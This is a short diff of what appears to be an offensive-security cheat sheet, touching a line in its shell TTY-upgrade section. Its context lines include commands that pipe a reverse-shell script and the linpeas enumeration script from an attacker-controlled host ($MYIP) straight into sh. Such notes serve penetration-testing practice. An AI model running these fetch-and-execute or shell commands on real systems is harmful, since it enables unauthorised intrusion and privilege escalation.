@@ -1202,7 +1202,7 @@ wget -qO- http://$MYIP:8888/resh | sh
 +---------- Upgrade TTY ----------+
 script /dev/null -c bash
 python3 -c 'import pty; pty.spawn("/bin/bash")';
-# CTRL-Z; stty size; stty raw -echo; fg; export SHELL=bash; export TERM=xterm-256color; stty rows <num> columns <num>; reset
+CTRL-Z; stty size; stty raw -echo; fg; export SHELL=bash; export TERM=xterm-256color; stty rows <num> columns <num>; reset
 
 [*] File Transfer
 curl http://$MYIP:8888/linux/linpeas.sh | sh
